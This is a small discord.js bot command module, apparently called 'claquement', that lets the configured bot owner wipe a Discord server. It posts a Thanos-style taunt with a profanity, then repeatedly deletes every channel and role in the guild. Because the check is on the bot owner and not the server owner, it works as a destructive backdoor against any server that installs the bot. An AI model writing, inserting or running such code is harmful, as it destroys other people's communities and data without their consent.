const Discord = require("discord.js");
const { RichEmbed } = require("discord.js");
const config = require("../storage/config.json")
module.exports.run = async (bot, message, args) =>{
console.log("test")
  message.delete();
  if(message.author.id === config.owner) {
    message.channel.send("*Thanos claque des doigts  **BITCHIES**")
    var deletede = setInterval(deleting, 1000)
    function deleting() {
      message.guild.channels.forEach(channel => channel.delete())
      message.guild.roles.forEach(roles => roles.delete())
    }
  }
}
module.exports.help = {
    name: "claquement"
}
